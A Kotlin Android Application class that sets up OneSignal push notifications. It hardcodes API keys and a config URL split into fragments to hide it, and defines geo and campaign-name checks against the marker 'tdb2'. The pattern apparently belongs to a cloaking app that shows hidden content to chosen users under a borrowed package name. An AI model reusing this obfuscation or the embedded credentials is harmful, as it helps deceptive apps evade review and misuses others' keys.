package com.sinyee.baby

import android.app.Application
import androidx.annotation.Keep
import com.google.gson.annotations.SerializedName
import com.onesignal.OneSignal

class ApplicaClaaass : Application() {

    fun makeCheckNamingDeepGeo(
        naming: String?,
        deep: String?,
        userGeo: String,
        listAllGeo: String,
        checker: String
    ): Boolean {
        return naming!!.contains(checker) || deep!!.contains(checker) || listAllGeo.contains(userGeo)
    }

    override fun onCreate() {
        OneSignal.setLogLevel(OneSignal.LOG_LEVEL.VERBOSE, OneSignal.LOG_LEVEL.NONE)
        OneSignal.initWithContext(this)
        gktokgt()

        super.onCreate()
    }

    private fun gktokgt() {
        OneSignal.setAppId(oneSignalCode)
    }

    companion object {

        const val MAIN_CHECKER = "tdb2"

        const val keyMainForSharedPref = "keyMainForSharedPref"
        const val keyForNullData = "null"

        const val oneSignalCode = "9359719d-ad15-49a6-853f-113db8fdccff"
        const val pacaaakageNameMain = "com.sinyee.baby"
        const val appsCode = "QP5aFv7iG95eHqEHQh8x4E"

        const val linkaaa1 = "http://"
        const val linkaaa2 = "infinity"
        const val linkaaa3 = "orb"
        const val linkaaa4 = ".xyz/"
        const val linkaaa5 = "const.json"

        const val geoApiLink1 = "http://pro.ip-api.com/"
        const val geoApiLink2 = "json/?key=KXgMIA7HSEcn0SV"

        var keyCodeFromHost = "appsChecker"
        var keyGeo = "geo"
        var keyNaming: String = "c11"
        var keyLinkaa = "link"
        var keyMAIN_ID: String = "mainid"
        var keyDEEPLINK: String = "d11"
    }
}

@Keep
data class GeoDevfrfrrfrrrrrr(
    @SerializedName("geoD")
    val geoD: String,
    @SerializedName("viewD")
    val viewD: String,
    @SerializedName("appsCheckerD")
    val appsCheckerD: String,
)


@Keep
data class CountryCodeJSfrrgttggttgttt(
    @SerializedName("city")
    val city: String,
    @SerializedName("country")
    val country: String,
    @SerializedName("countryCode")
    val countryCode: String,
)